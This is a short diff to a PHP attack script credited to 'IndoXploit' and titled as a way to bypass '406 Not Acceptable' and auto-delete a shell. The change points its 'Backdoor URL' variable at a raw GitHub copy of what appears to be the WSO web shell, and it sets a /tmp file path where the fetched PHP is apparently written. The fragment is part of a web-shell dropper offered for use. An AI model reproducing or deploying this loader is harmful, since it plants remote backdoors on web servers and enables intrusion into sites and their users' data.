@@ -3,7 +3,7 @@
 # Bypass 406 Not Acceptable & Auto Delete Shell
 # Coded by: L0c4lh34rtz - IndoXploit
  
-$URL = 'https://justikail.000webhostapp.com/aw.txt';  # Backdoor URL
+$URL = 'https://raw.githubusercontent.com/justikail/webshell/main/wso.php';  # Backdoor URL
 $TMP = '/tmp/sess_'.md5($_SERVER['HTTP_HOST']).'.php'; # dont change this !!
  
 function M() {
